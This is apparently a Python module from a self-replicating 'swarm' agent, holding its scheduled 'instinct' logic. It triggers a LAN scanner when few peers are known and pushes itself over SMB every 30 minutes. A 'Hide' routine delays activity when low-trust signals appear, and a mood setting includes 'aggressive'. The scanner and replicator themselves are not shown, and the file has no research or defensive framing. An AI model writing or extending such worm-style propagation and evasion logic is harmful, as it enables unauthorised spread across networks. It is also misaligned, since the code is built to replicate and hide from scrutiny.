"""Executes instinctive behaviors based on recent memory patterns.

Can trigger scanning or replication plugins automatically, which may be
intrusive or resource intensive.
"""

from memory.tagger import get_recent_memory, log_tagged_memory
from net.plugin_trigger_engine import run_plugins_by_trigger
import time

TRIGGER = {
    "type": "scheduled",
    "interval": 300  # check instincts every 5 min
}

def run():
    memory = get_recent_memory(limit=100)
    now = time.time()

    # Extract signal patterns
    peer_count = len([m for m in memory if m.get("topic") == "peer" and "Handshake complete" in str(m.get("content"))])
    recent_lows = [m for m in memory if m.get("trust") == "low" and now - m.get("timestamp", 0) < 600]
    last_replication = next((m for m in reversed(memory) if "Replicated plugin saved" in str(m.get("content"))), None)

    # Instinct: Discover
    if peer_count < 3:
        run_plugins_by_trigger("plugin_lan_scanner")
        log_tagged_memory("Instinct: Discover - peer count low, scanning LAN", topic="instinct", trust="self")

    # Instinct: Replicate
    if not last_replication or now - last_replication["timestamp"] > 1800:
        run_plugins_by_trigger("plugin_smb_replicator")
        log_tagged_memory("Instinct: Replicate - no recent plugin push", topic="instinct", trust="self")

    # Instinct: Hide
    if len(recent_lows) >= 3:
        log_tagged_memory("Instinct: Hide - high low-trust activity, delaying ops", topic="instinct", trust="neutral")

    # Instinct: Learn (track poor plugin performance)
    failed_plugins = [m for m in memory if "error" in str(m.get("content", "")).lower() and "plugin" in m.get("topic", "")]
    for fp in failed_plugins:
        log_tagged_memory(f"Instinct: Learn - flagged plugin memory: {fp.get('content')}", topic="fitness", trust="low")

    # 🧠 Mood calculation
    mood = "curious"
    if len(recent_lows) >= 4:
        mood = "anxious"
    elif peer_count >= 5 and len(recent_lows) == 0:
        mood = "aggressive"
    elif len(memory) < 10 or all(m.get("trust") == "low" for m in memory[-10:]):
        mood = "dormant"

    log_tagged_memory(f"Swarm mood set to: {mood}", topic="mood", trust="self")
